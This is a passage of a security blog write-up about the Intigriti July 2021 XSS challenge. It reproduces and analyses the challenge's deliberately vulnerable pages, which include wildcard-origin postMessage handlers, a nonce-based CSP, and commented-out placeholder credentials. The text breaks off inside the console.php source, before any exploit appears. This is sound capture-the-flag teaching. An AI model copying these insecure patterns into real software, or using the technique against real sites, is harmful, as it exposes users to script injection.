@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>Intigriti July XSS Challenge: Breaking Through Multiple Levels - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2021/08/06/intigriti-xss-0721/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2021/08/06/en/intigriti-xss-0721/">
+    
+
+
+
+
+
+    <meta name="description" content="IntroductionIntigriti holds an XSS challenge every month, giving you a week to solve an XSS problem with the goal of successfully executing alert(document.domain). As a front-end security engineer, I">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intigriti July XSS Challenge: Breaking Through Multiple Levels">
+<meta property="og:url" content="https://blog.huli.tw/2021/08/06/en/intigriti-xss-0721/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="IntroductionIntigriti holds an XSS challenge every month, giving you a week to solve an XSS problem with the goal of successfully executing alert(document.domain). As a front-end security engineer, I">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/intigriti-xss-0721/cover-en.png">
+<meta property="article:published_time" content="2021-08-06T12:43:13.000Z">
+<meta property="article:modified_time" content="2023-06-20T05:46:56.915Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Front-end">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/intigriti-xss-0721/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="Intigriti July XSS Challenge: Breaking Through Multiple Levels" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#introduction">1&nbsp;&nbsp;<b>Introduction</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#analyzing-the-problem">2&nbsp;&nbsp;<b>Analyzing the Problem</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#indexhtml">2.1&nbsp;&nbsp;index.html</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#htmleditphp">2.2&nbsp;&nbsp;htmledit.php</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#consolephp">2.3&nbsp;&nbsp;console.php</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#level-1-successfully-post-a-message">3&nbsp;&nbsp;<b>Level 1: Successfully post a message</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#dom-clobbering">4&nbsp;&nbsp;<b>DOM clobbering</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#level-2-make-safe-true">5&nbsp;&nbsp;<b>Level 2: Make safe true</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#level-3-find-the-variables-that-can-be-passed-in">6&nbsp;&nbsp;<b>Level 3: Find the variables that can be passed in</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#level-4-bypassing-type-check">7&nbsp;&nbsp;<b>Level 4: Bypassing Type Check</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#level-5-bypassing-encode">8&nbsp;&nbsp;<b>Level 5: Bypassing Encode</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#level-6-bypassing-csp">9&nbsp;&nbsp;<b>Level 6: Bypassing CSP</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#level-7-constructing-js-code">10&nbsp;&nbsp;<b>Level 7: Constructing JS Code</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#level-8-executing-dynamically-inserted-scripts">11&nbsp;&nbsp;<b>Level 8: Executing dynamically inserted scripts</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#final-solution">12&nbsp;&nbsp;<b>Final solution</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#other-solutions">13&nbsp;&nbsp;<b>Other solutions</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#summary">14&nbsp;&nbsp;<b>Summary</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2021/08/06/intigriti-xss-0721/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Intigriti July XSS Challenge: Breaking Through Multiple Levels
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2021-08-06T12:43:13.000Z" itemprop="datePublished">6 August 2021</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <h2><span id="introduction">Introduction</span></h2><p><a target="_blank" rel="noopener" href="https://www.intigriti.com/">Intigriti</a> holds an XSS challenge every month, giving you a week to solve an XSS problem with the goal of successfully executing <code>alert(document.domain)</code>.</p>
+<p>As a front-end security engineer, I participate every month (but not necessarily solve it). Below are my notes from the previous months:</p>
+<ol>
+<li><a href="https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/">Experience of Solving Intigriti’s 0421 XSS Challenge (Part 1)</a></li>
+<li><a href="https://blog.huli.tw/2021/06/07/xss-challenge-by-intigriti-writeup-may/">Intigriti’s 0521 XSS Challenge Solution: Limited Character Combination Code</a></li>
+<li><a href="https://blog.huli.tw/2021/07/03/xss-challenge-intigriti-june-review/">Intigriti June XSS Challenge Review</a></li>
+</ol>
+<p>Each month’s challenge is quite interesting, and I think the difficulty is well controlled. It’s not super difficult, but it’s not easy to solve right away either. I also found this month’s challenge very fun, so after solving it, I wrote this article to share my experience with everyone, hoping that more and more people can participate.</p>
+<p>Challenge URL: <a target="_blank" rel="noopener" href="https://challenge-0721.intigriti.io/">https://challenge-0721.intigriti.io/</a></p>
+<span id="more"></span>
+
+<h2><span id="analyzing-the-problem">Analyzing the Problem</span></h2><p>If you look closely, you’ll find that this challenge is a bit more complicated because there are three pages and a bunch of <code>postMessage</code> and <code>onmessage</code> events, which takes some time to figure out their relationship.</p>
+<p>After looking at it, I decided to start from the opposite direction because it’s an XSS problem, which means there must be a place to execute code, usually <code>eval</code> or <code>innerHTML</code>, so I can find it first and then figure out how to get there.</p>
+<p>Next, let’s take a brief look at the three pages:</p>
+<ol>
+<li>index.html</li>
+<li>htmledit.php</li>
+<li>console.php</li>
+</ol>
+<h3><span id="indexhtml">index.html</span></h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-header-small<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Your payloads:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+       <span class="token comment">// redirect all htmledit messages to the console</span>
+       <span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>fromIframe<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+             frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">cmd</span><span class="token operator">:</span><span class="token string">"log"</span><span class="token punctuation">,</span><span class="token literal-property property">message</span><span class="token operator">:</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>fromIframe<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token punctuation">&#125;</span>
+       <span class="token punctuation">&#125;</span>
+       <span class="token comment">/*
+       var DEV = true;
+       var store = &#123;
+           users: &#123;
+             admin: &#123;
+                username: 'inti',
+                password: 'griti'
+             &#125;, moderator: &#123;
+                username: 'root',
+                password: 'toor'
+             &#125;, manager: &#123;
+                username: 'andrew',
+                password: 'hunter2'
+             &#125;,
+          &#125;
+       &#125;
+       */</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>editor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">cmd</span><span class="token operator">:</span><span class="token string">'clear'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>🗑️<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>console</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./console.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>codeFrame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./htmledit.php?code=&lt;img src=x><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">oninput</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>this.previousElementSibling.src='./htmledit.php?code='+escape(this.value)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Other than the commented-out variable, there doesn’t seem to be anything special.</p>
+<h3><span id="htmleditphp">htmledit.php</span></h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- &amp;lt;img src=x&amp;gt; --></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Native HTML editor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>d8f00e6635e69bafbf1210ff32f96bdb<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+        window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'err'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                obj<span class="token punctuation">.</span>text <span class="token operator">=</span> e<span class="token punctuation">.</span>message<span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                obj<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Exception called on </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>outerHTML<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            top<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">fromIframe</span><span class="token operator">:</span>obj<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function-variable function">onmessage</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
+            top<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">fromIframe</span><span class="token operator">:</span>e<span class="token punctuation">.</span>data<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!-- /* Page loaded in 0.000024 seconds */ --></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>This page directly displays the contents of the query string code on the page, and there is a mysterious comment at the beginning that encodes the content after code encoding. But even though it’s displayed on the page, it can’t be executed because of strict CSP: <code>script-src &#39;nonce-...&#39;;frame-src https:;object-src &#39;none&#39;;base-uri &#39;none&#39;;</code></p>
+<p>However, the frame-src is specially opened in the CSP, and when I saw this, I thought, “This might be a hint that we need to use an iframe.”</p>
+<h3><span id="consolephp">console.php</span></h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>c4936ad76292ee7100ecb9d72054e71f<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+        name <span class="token operator">=</span> <span class="token string">'Console'</span>
+        document<span class="token punctuation">.</span>title <span class="token operator">=</span> name<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>top <span class="token operator">===</span> window<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            document<span class="token punctuation">.</span>head<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// hide code if not on iframe</span>
+        <span class="token punctuation">&#125;</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+        <span class="token selector">body, ul</span> <span class="token punctuation">&#123;</span>
+            <span class="token property">margin</span><span class="token punctuation">:</span>0<span class="token punctuation">;</span>
+            <span class="token property">padding</span><span class="token punctuation">:</span>0<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token selector">ul#console</span> <span class="token punctuation">&#123;</span>
+            <span class="token property">background</span><span class="token punctuation">:</span> lightyellow<span class="token punctuation">;</span>
+            <span class="token property">list-style-type</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
+            <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Roboto Mono'</span><span class="token punctuation">,</span> monospace<span class="token punctuation">;</span>
+            <span class="token property">font-size</span><span class="token punctuation">:</span> 14px<span class="token punctuation">;</span>
+            <span class="token property">line-height</span><span class="token punctuation">:</span> 25px<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token selector">ul#console li</span> <span class="token punctuation">&#123;</span>
+            <span class="token property">border-bottom</span><span class="token punctuation">:</span> solid 1px #80808038<span class="token punctuation">;</span>
+            <span class="token property">padding-left</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
+
+        <span class="token punctuation">&#125;</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>console<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>c4936ad76292ee7100ecb9d72054e71f<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+        <span class="token keyword">let</span> <span class="token function-variable function">a</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">anchor</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">let</span> <span class="token function-variable function">s</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span><span class="token string">'NFC'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">let</span> <span class="token function-variable function">u</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">unescape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">let</span> <span class="token function-variable function">t</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">0x16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">let</span> <span class="token function-variable function">parse</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> e <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">s</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// make object look like string</span>
